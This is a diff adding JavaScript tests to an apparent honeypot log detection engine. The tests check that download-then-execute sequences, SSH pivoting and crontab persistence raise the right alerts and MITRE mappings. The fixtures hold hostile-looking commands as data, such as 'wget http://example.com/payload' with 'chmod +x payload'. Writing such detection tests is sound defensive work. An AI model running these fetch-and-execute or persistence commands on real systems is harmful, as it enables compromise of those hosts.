@@ -204,3 +204,40 @@ test('Uppercase account-creation commands still produce the specific alert', () 
         alert.title === 'Backdoor Account Created'
     ));
 });
+
+
+test('Download-execution correlation preserves repeated command order', () => {
+    const executionBeforeDownloadOnly = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' }
+    ]);
+
+    const executionBeforeAndAfterDownload = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' },
+        { eventid: 'cowrie.command.input', input: 'wget http://example.com/payload' },
+        { eventid: 'cowrie.command.input', input: 'chmod +x payload' }
+    ]);
+
+    assert.ok(!executionBeforeDownloadOnly.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+
+    assert.ok(executionBeforeAndAfterDownload.explanations.some(e =>
+        e.reason.includes('Download → Execute sequence')
+    ));
+});
+
+test('Uppercase pivot and persistence commands retain their classifications', () => {
+    const result = engine.evaluateSessionEvents([
+        { eventid: 'cowrie.login.success', username: 'root' },
+        { eventid: 'cowrie.command.input', input: 'SSH pivot.example.com' },
+        { eventid: 'cowrie.command.input', input: 'CRONTAB -e' }
+    ]);
+
+    assert.ok(result.alerts.some(alert =>
+        alert.title === 'Lateral Movement Detected'
+    ));
+    assert.ok(result.mitre.some(technique => technique.id === 'T1053'));
+});
